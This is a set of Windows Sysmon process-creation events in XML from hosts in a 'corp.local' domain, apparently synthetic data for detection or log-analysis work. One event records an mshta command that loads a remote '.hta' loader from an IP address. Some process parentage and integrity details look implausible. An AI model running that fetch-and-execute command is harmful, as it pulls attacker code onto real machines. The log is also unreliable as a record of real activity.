<Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T08:25:41.7796514Z"/>
      <EventRecordID>184023</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>SRV-FILE01.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 08:25:41.768</Data>
      <Data Name="ProcessGuid">{91e1aa96-9c3e-ab0e-6105-0758561e16d1}</Data>
      <Data Name="ProcessId">9098</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.19041.3486</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\System32\svchost.exe -k netsvcs -p</Data>
      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
      <Data Name="User">CORP\asingh</Data>
      <Data Name="LogonGuid">{533420e6-2e8d-7cd0-364d-cc3e5ad5cf06}</Data>
      <Data Name="LogonId">0x522362</Data>
      <Data Name="TerminalSessionId">2</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">MD5=B380C73A989D9D4AE15CA6664797B2C9,SHA256=15EABB2730E912F2F2B43ABF8441AEFD0299436A8E48522346B98991E14EB70D,IMPHASH=7D137018680BAC63B856D0353DC98290</Data>
      <Data Name="ParentProcessGuid">{8e200724-c217-3d85-b0cb-a55979e13cea}</Data>
      <Data Name="ParentProcessId">9041</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
      <Data Name="ParentUser">CORP\asingh</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T08:24:24.4081983Z"/>
      <EventRecordID>184024</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION15.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 08:24:24.414</Data>
      <Data Name="ProcessGuid">{4e6384bb-a9f9-94e0-5e78-8db079279973}</Data>
      <Data Name="ProcessId">9698</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.19041.1409</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
      <Data Name="User">CORP\jdoe</Data>
      <Data Name="LogonGuid">{6cedd15d-ff23-bef5-8ce6-5a1054aebd1b}</Data>
      <Data Name="LogonId">0xc3ee4d</Data>
      <Data Name="TerminalSessionId">2</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">MD5=3B048A8B405BFDC94E7ED827455AC762,SHA256=F36CB62B892E6161BE2D740A1E9B23BC50C7C006314D3441B8A6171F1EE34DC4,IMPHASH=3108D4482F65FAFAB0AE8F08C31EDBBC</Data>
      <Data Name="ParentProcessGuid">{3764fbda-bd15-7bf4-46c8-96efb97e6703}</Data>
      <Data Name="ParentProcessId">9595</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
      <Data Name="ParentUser">CORP\jdoe</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T08:33:20.6054579Z"/>
      <EventRecordID>184025</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION22.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 08:33:20.232</Data>
      <Data Name="ProcessGuid">{2defe193-4d61-039f-b540-206788bd13d1}</Data>
      <Data Name="ProcessId">5494</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">10.0.19041.187</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">mshta.exe</Data>
      <Data Name="CommandLine">mshta.exe http://45.77.65.102/loader.hta</Data>
      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
      <Data Name="User">CORP\jdoe</Data>
      <Data Name="LogonGuid">{f96b648a-0df5-8da8-4ac9-f1afb289f224}</Data>
      <Data Name="LogonId">0x3053da</Data>
      <Data Name="TerminalSessionId">3</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">MD5=1A432F0A7DAA39F0C0B6FCE2DE53790A,SHA256=5738811D70C2903F7A8D03AA782A65E048CA765192F5DF7B0323D342DF6A8F93,IMPHASH=40A26C600D270659F72ADA9B2F32751E</Data>
      <Data Name="ParentProcessGuid">{f0e98b3b-dc99-7a4c-1d34-10bad2762bdc}</Data>
      <Data Name="ParentProcessId">7565</Data>
      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
      <Data Name="ParentUser">CORP\jdoe</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T08:18:38.9442881Z"/>
      <EventRecordID>184026</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION07.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 08:18:38.152</Data>
      <Data Name="ProcessGuid">{f2f9e5fa-4dc8-15ce-fe71-1e523f897142}</Data>
      <Data Name="ProcessId">7818</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.19041.2484</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
      <Data Name="User">CORP\ktanaka</Data>
      <Data Name="LogonGuid">{989bc4da-ca6d-9e50-39c6-85c7c693da11}</Data>
      <Data Name="LogonId">0x716074</Data>
      <Data Name="TerminalSessionId">2</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">MD5=DC33E1F94C1F55AB715629EEE893BE3D,SHA256=9C10C5720F6B40D09EFBA58B9191B3634E2D66456DC7CAC7FD72B05096A9954F,IMPHASH=F295456E19675F06BD767E35F5C9B047</Data>
      <Data Name="ParentProcessGuid">{c342bd2b-3531-a021-3605-a91143bfd931}</Data>
      <Data Name="ParentProcessId">2330</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
      <Data Name="ParentUser">CORP\ktanaka</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T08:20:15.6853787Z"/>
      <EventRecordID>184027</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION07.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 08:20:15.002</Data>
      <Data Name="ProcessGuid">{735435ea-b07a-9804-784c-085b4a8ff810}</Data>
      <Data Name="ProcessId">4792</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.19041.1181</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
      <Data Name="User">CORP\mrodriguez</Data>
      <Data Name="LogonGuid">{b4fb0eb9-4860-b3f6-dc0f-1238743b65a2}</Data>
      <Data Name="LogonId">0xbff875</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">MD5=CA8F3653C9AF18F843B9DA13EC856F37,SHA256=1D61FAC36CD5E85932A447B2EF04E57DCDCCC33AA9434AA096FC734DA003CD28,IMPHASH=26242B40A5CB63A2398D1CA68B6870B5</Data>
      <Data Name="ParentProcessGuid">{e88da719-4400-d39e-2469-0f441247ea4e}</Data>
      <Data Name="ParentProcessId">3718</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
      <Data Name="ParentUser">CORP\mrodriguez</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T08:54:36.7863447Z"/>
      <EventRecordID>184028</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION15.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 08:54:36.127</Data>
      <Data Name="ProcessGuid">{b04d3376-4dd8-b321-670a-45b1f1533ae8}</Data>
      <Data Name="ProcessId">9199</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.19041.2212</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\explorer.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
      <Data Name="User">CORP\ktanaka</Data>
      <Data Name="LogonGuid">{7e695d0d-7010-1497-9918-e3b10a3450fc}</Data>
      <Data Name="LogonId">0x7e996e</Data>
      <Data Name="TerminalSessionId">3</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">MD5=069F14F140181C6E9A8CFA3C5283AAC7,SHA256=964DB03F93403FADDC4AD56BD6016237AC9ED156F63FCE413A9ACA5E176132ED,IMPHASH=C3C75611FFE3FA49054F92FFF366BAD4</Data>
      <Data Name="ParentProcessGuid">{ac1aa554-d248-44fe-9384-c35b0a4c9f7f}</Data>
      <Data Name="ParentProcessId">3870</Data>
      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
      <Data Name="ParentUser">CORP\ktanaka</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-07-26T09:55:31.3044882Z"/>
      <EventRecordID>184029</EventRecordID>
      <Correlation/>
      <Execution ProcessID="3456" ThreadID="3980"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>SRV-FILE01.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-07-26 09:55:31.284</Data>
      <Data Name="ProcessGuid">{ff37d19c-95d8-6f96-a281-7de1d0725b5c}</Data>
      <Data Name="ProcessId">2494</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.19041.1926</Data>
      <Data Name="Description">-</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\SYSTEM\</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
      <Data Name="LogonGuid">{5913f9d3-6889-5553-5230-1ac7ab8ddeb4}</Data>
      <Data Name="LogonId">0xeb9465</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">MD5=7ED70ED7B194990B6961929E546E035A,SHA256=0964FBBF8CD321B0C2B01CFDD045DD1C668409E3F1F8343EA99F131849C8A43F,IMPHASH=409D360250843242168B1625746F7891</Data>
      <Data Name="ParentProcessGuid">{52c21221-1dad-f85e-c5c5-dd6a6778043b}</Data>
      <Data Name="ParentProcessId">9431</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -NoProfile</Data>
      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
</Events>
